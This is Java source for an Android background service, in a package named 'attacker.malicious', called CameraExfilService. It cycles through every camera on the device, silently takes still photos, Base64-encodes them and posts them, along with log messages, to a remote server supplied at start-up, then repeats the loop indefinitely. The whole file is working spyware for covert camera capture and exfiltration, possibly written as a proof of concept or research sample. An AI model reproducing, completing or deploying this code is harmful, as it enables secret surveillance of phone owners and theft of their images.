package attacker.malicious;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraMetadata;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.params.StreamConfigurationMap;
import android.media.Image;
import android.media.ImageReader;
import android.os.IBinder;
import android.support.annotation.NonNull;
import android.support.v4.content.ContextCompat;
import android.util.Base64;
import android.util.Log;
import android.util.Size;
import android.view.Surface;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Queue;
import java.util.TreeMap;

public class CameraExfilService extends Service {
    private CameraManager manager;
    private TreeMap<String, byte[]> picturesTaken;
    private CameraDevice cameraDevice;
    private boolean cameraClosed;
    private Queue<String> cameraIds;
    private ImageReader imageReader;
    private String server;

    public CameraExfilService() {
        super();
    }

    private void log(String msg) {
        HashMap<String, String> data = new HashMap<>();
        data.put("log", msg);
        send(data);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        log("CameraExfSrv", "service started");
        server = intent.getExtras().getString("server");
        run();
        return Service.START_NOT_STICKY;
    }

    public void run() {
        try {
            if (checkPermissions()) {
                getManager();
                this.picturesTaken = new TreeMap<>();
                final String[] _cameraIds = this.manager.getCameraIdList();
                if (_cameraIds.length > 0) {
                    this.cameraIds = new LinkedList<>();
                    this.cameraIds.addAll(Arrays.asList(_cameraIds));
                    openCamera(this.cameraIds.poll());
                } else {
                    onNoCameraDetected();
                }
            }
            Thread.sleep(2000);
        } catch (CameraAccessException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onDestroy() {
        log("CameraExfSrv", "onDestroy: service stopped");
    }

    public boolean checkPermissions() {
        return (ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED
            && ContextCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.INTERNET)
            == PackageManager.PERMISSION_GRANTED);
    }

    public void getManager() {
        this.manager = (CameraManager) getApplicationContext().getSystemService(
                Context.CAMERA_SERVICE);
    }

    private final CameraDevice.StateCallback stateCallback = new CameraDevice.StateCallback() {
        @Override
        public void onOpened(@NonNull CameraDevice camera) {
            cameraClosed = false;
            cameraDevice = camera;
            // TODO: use Handler().postDelayed...
            takePicture();
        }

        @Override
        public void onDisconnected(@NonNull CameraDevice camera) {
            if (cameraDevice != null && !cameraClosed) {
                cameraDevice.close();
                cameraClosed = true;
            }
        }

        @Override
        public void onClosed(@NonNull CameraDevice camera) {
            cameraClosed = true;
            if (!cameraIds.isEmpty()) {
                takeAnotherPicture();
            } else {
                onDoneCapturingAllPhotos();
            }
        }

        @Override
        public void onError(@NonNull CameraDevice camera, int error) {
            if (cameraDevice != null && !cameraClosed) {
                cameraDevice.close();
                cameraClosed = true;
            }
            log("cameraexfilse", "onError: int code =" + Integer.toString(error));
        }
    };

    private void openCamera(String id) {
        try {
            this.manager.openCamera(id, stateCallback, null);
        } catch (CameraAccessException e) {
            e.printStackTrace();
        } catch (SecurityException e) {
            e.printStackTrace();
        }
    }

    private void closeCamera() {
        if (cameraDevice != null && !cameraClosed) {
            cameraDevice.close();
            cameraDevice = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }

    private final CameraCaptureSession.CaptureCallback captureListener = new CameraCaptureSession.CaptureCallback() {
        @Override
        public void onCaptureCompleted(@NonNull CameraCaptureSession session,
                                       @NonNull CaptureRequest request,
                                       @NonNull TotalCaptureResult result) {
            super.onCaptureCompleted(session, request, result);
            if (picturesTaken.lastEntry() != null) {
                onCaptureDone(picturesTaken.lastEntry().getKey(), picturesTaken.lastEntry().getValue());
            }
            closeCamera();
        }
    };

    private final ImageReader.OnImageAvailableListener onImageAvailableListener = new ImageReader.OnImageAvailableListener() {
        @Override
        public void onImageAvailable(ImageReader imReader) {
            final Image image = imReader.acquireLatestImage();
            final ByteBuffer buffer = image.getPlanes()[0].getBuffer();
            final byte[] bytes = new byte[buffer.capacity()];
            buffer.get(bytes);
            saveImage(bytes);
            image.close();
        }
    };

    public void saveImage(final byte[] bytes) {
        this.picturesTaken.put(this.cameraDevice.getId() + "-" + new Date().toString(), bytes);
    }

    private void takePicture() {
        try {
            if (cameraDevice == null) {
                return;
            }
            final CameraCharacteristics cameraCharacteristics = this.manager.getCameraCharacteristics(
                    cameraDevice.getId());
            Size[] jpegSizes = null;
            StreamConfigurationMap streamConfigurationMap = cameraCharacteristics.get(
                    CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP);
            if (streamConfigurationMap != null) {
                jpegSizes = streamConfigurationMap.getOutputSizes(ImageFormat.JPEG);
            }
            int height, width;
            if (jpegSizes != null && jpegSizes.length > 0) {
                height = jpegSizes[0].getHeight();
                width = jpegSizes[0].getWidth();
            } else {
                height = 640;
                width = 480;
            }
            final ImageReader reader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1);
            final List<Surface> outputSurfaces = new ArrayList<>();
            outputSurfaces.add(reader.getSurface());
            final CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(
                    CameraDevice.TEMPLATE_STILL_CAPTURE);
            captureBuilder.addTarget(reader.getSurface());
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO);
            captureBuilder.set(CaptureRequest.JPEG_ORIENTATION, Surface.ROTATION_0);
            reader.setOnImageAvailableListener(onImageAvailableListener, null);
            cameraDevice.createCaptureSession(outputSurfaces, new CameraCaptureSession.StateCallback() {
                @Override
                public void onConfigured(@NonNull CameraCaptureSession session) {
                    try {
                        session.capture(captureBuilder.build(), captureListener, null);
                    } catch (CameraAccessException e) {
                        e.printStackTrace();
                    }
                }

                @Override
                public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                    log("cameraexfilse", "onConfigurefailed");
                }
            }, null);
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }
    }

    private void takeAnotherPicture() {
        openCamera(this.cameraIds.poll());
    }

    public void send(final HashMap<String, String> data) {
        RequestQueue queue = Volley.newRequestQueue(getApplicationContext());
        StringRequest req = new StringRequest(
                Request.Method.POST,
                server,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {}
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError err) {}
                }) {
            @Override
            protected Map<String, String> getParams() {
                return data;
            }
        };
        queue.add(req);
    }

    public void onCaptureDone(String pictureKey, byte[] pictureData) {

    }

    public void onDoneCapturingAllPhotos() {
        for(Map.Entry<String, byte[]> entry : picturesTaken.entrySet()) {
            byte[] pictureBytes =  entry.getValue();
            String b64_encoded_bytes = Base64.encodeToString(pictureBytes, 0);
            HashMap<String, String> data = new HashMap<>();
            data.put("picture", b64_encoded_bytes);
            send(data);
        }
        try {
            Thread.sleep(5000);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        run();
    }

    public void onNoCameraDetected() {

    }

    public void _log(final String msg) {
        RequestQueue queue = Volley.newRequestQueue(getApplicationContext());
        StringRequest req = new StringRequest(
                Request.Method.POST,
                server,
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {}
                },
                new Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError err) {}
                }) {
            @Override
            protected Map<String, String> getParams() {
                HashMap<String, String> params = new HashMap<>();
                params.put("log", msg);
                return params;
            }
        };
        queue.add(req);
    }

    public void log(String label, String msg) {
        _log(label + ": " + msg);
    }
}
